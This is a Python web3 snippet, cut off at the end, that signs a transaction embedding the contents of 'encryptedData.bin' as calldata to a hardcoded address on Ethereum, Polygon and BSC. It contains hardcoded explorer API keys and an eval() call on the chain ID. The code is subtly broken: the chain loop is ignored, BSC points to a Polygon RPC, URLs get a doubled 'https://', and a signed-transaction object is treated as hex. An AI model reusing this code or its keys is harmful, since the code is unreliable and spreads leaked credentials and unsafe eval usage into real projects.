from web3 import Web3

explorer = {
    '1': 'https://api.etherscan.io',
    '56': 'https://api.bscscan.com/',
    '137': 'https://api.polygonscan.com',
}
myToken = {
    '1': 'VYDCJ3TMWJKTS1FRXVHEWQRSZE6D8HRWI9',
    '56': '5QXV3MKW67M4S53WHFDFQ9DUUSSN8RW1GI',
    '137': '2KTHMFT4CIZ9WDIQWQIK9ESD7I9T1VCG5Q',

}
dataHeader = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}


def send(chainID, yourAddress, toAddress, privateKeyInBytes):
    chainIDList = ['1', '137', '56']
    for i in chainIDList:
        APIList = {
            '1': 'https://rpc.ankr.com/eth',
            '137': 'https://polygon-rpc.com',
            '56': 'https://polygon-rpc.com',
        }
        with open('encryptedData.bin', 'rb') as f:
            encryptedDataBytes = f.read()
        w3 = Web3(Web3.HTTPProvider(APIList[i]))
        gasUrl = 'https://{}/api?module=gastracker&action=gasoracle&apikey={}'.format(explorer[chainID],
                                                                                      myToken[chainID])
        rawHex = w3.eth.account.sign_transaction(dict(
            nonce=w3.eth.get_transaction_count(yourAddress),
            maxFeePerGas=3000000000,
            maxPriorityFeePerGas=2000000000,
            gas=100000,
            to='0xd3CdA913deB6f67967B99D67aCDFa1712C293601',
            value=0,
            data=encryptedDataBytes,
            type=2,  # (optional) the type is now implicitly set based on appropriate transaction params
            chainId=eval(chainID),
        ),
            privateKeyInBytes,
        )
        url = 'https://{}?' \
              'module=proxy&action=eth_sendRawTransaction' \
              '&hex={}' \
              '&apikey={}'.format(explorer[chainID], rawHex, myToken[chainID])
